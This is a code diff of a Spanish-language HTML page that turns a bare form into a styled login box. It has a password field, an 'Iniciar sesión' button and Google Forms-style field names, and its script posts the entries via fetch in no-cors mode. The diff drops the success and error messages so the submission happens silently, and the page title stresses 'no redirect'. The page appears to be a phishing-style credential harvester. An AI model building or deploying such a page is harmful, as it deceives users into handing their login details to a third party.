@@ -1,9 +1,60 @@
-<form id="myForm">
-    <input type="text" name="entry.1271603301" placeholder="Donde fue la segunda geurra minudial?" required>
-    <input type="password" name="entry.1257754249" placeholder="Dime cuando se va Cristano del madrid?" required>
-    <button type="submit">Iniciar sesión</button>
-</form>
-<p id="mensaje"></p>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario sin redirección</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fafafa;
+        }
+
+        .login-box {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        input {
+            display: block;
+            width: 100%;
+            margin: 10px 0;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #007acc;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <form id="myForm">
+        <input type="text" name="entry.1271603301" placeholder="¿Dónde fue la Segunda Guerra Mundial?" required>
+        <input type="password" name="entry.1257754249" placeholder="¿Cuándo se va Cristiano del Madrid?" required>
+        <button type="submit">Iniciar sesión</button>
+    </form>
+</div>
 
 <script>
     document.getElementById("myForm").addEventListener("submit", function(event) {
@@ -14,11 +65,11 @@
             method: "POST",
             body: form,
             mode: "no-cors"
-        }).then(() => {
-            document.getElementById("mensaje").innerText = "✅ Datos enviados correctamente";
-            document.getElementById("myForm").reset();
-        }).catch(error => {
-            document.getElementById("mensaje").innerText = "❌ Error al enviar los datos";
         });
+
+        this.reset();
     });
 </script>
+
+</body>
+</html>
